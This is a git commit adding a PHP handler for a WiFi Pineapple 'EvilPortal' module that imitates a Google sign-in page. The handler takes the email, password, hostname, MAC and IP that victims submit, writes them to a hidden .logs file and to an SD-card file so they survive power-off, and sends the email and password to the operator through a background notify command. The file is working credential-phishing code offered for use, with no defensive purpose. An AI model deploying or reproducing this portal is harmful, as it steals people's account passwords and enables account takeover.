21a565224b5f2b36f20b0a6c06a7f495d771a961
Anneliese-Menday <156784792+Anneliese-Menday@users.noreply.github.com>
2025-07-25 10:33:00 +1000

    GoogleSignIn EvilPortal files

---
+++ GoogleSignInPortal/MyPortal.php
@@ -0,0 +1,43 @@
+//Most of this is the default MyPortal from https://github.com/hak5/nano-tetra-modules/blob/master/EvilPortal/includes/skeleton/MyPortal.php
+
+<?php namespace evilportal;
+
+class MyPortal extends Portal
+{
+
+    public function handleAuthorization()
+    {
+        // handle form input or other extra things there
+        // the stuff in here is from https://github.com/kleo/evilportals/tree/master
+        if (isset($_POST['email'])) {
+            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
+            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
+            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
+            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
+            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
+
+            $reflector = new \ReflectionClass(get_class($this));
+            $logPath = dirname($reflector->getFileName());
+            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+
+            //this is my line for putting it in the flash drive so it survives the device being turned off
+            file_put_contents("{/sd/evilGoogle.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+            $this->execBackground("notify $email' - '$pwd");
+        }
+
+        // Call parent to handle basic authorization first
+        parent::handleAuthorization();
+    }
+
+    public function onSuccess()
+    {
+        // Calls default success message
+        parent::onSuccess();
+    }
+
+    public function showError()
+    {
+        // Calls default error message
+        parent::showError();
+    }
+}
